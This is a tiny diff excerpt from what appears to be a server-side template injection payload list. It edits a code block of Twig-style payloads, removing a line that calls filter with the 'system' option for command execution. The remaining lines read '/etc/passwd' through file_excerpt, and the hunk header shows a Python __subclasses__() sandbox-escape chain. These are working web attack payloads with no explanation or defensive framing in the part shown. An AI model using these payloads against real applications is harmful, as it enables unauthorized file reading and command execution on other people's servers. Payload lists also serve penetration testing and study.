@@ -182,7 +182,8 @@ for item in "".__class__.__mro__[-1].__subclasses__():
 
 ```
 {{app.request.request.get('name')}}
-{{app.request.query.filter(0,0,1024,{'options':'system'})}} 
+
+
 {{'/etc/passwd'|file_excerpt(1,30)}}
 
 ```
